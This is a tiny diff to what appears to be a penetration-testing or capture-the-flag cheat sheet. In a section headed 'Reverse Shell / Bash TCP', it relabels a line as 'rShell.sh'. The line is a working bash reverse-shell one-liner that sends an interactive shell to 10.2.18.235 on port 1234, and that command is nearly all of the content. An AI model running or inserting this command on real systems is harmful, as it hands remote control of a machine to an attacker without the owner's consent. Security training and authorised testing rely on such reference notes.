@@ -9,4 +9,4 @@
 
 ## Reverse Shell
 ### Bash TCP
-`bash -i >& /dev/tcp/10.2.18.235/1234 0>&1`  
+rShell.sh : `bash -i >& /dev/tcp/10.2.18.235/1234 0>&1`  
